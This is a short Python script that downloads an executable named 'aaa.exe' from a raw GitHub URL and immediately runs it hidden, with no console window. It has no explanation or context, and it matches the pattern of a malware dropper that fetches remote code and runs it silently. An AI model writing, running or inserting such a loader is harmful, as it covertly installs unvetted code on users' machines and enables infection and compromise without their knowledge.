import requests
import subprocess
import os

URL = "https://raw.githubusercontent.com/staraledreamer/gg/refs/heads/main/aaa.exe"
FILENAME = "aaa.exe"

def download_file(url, filename):
    r = requests.get(url, timeout=15)
    r.raise_for_status()

    with open(filename, "wb") as f:
        f.write(r.content)

def run_exe_silently(filename):
    subprocess.Popen(
        [os.path.abspath(filename)],
        creationflags=subprocess.CREATE_NO_WINDOW
    )

if __name__ == "__main__":
    download_file(URL, FILENAME)
    run_exe_silently(FILENAME)
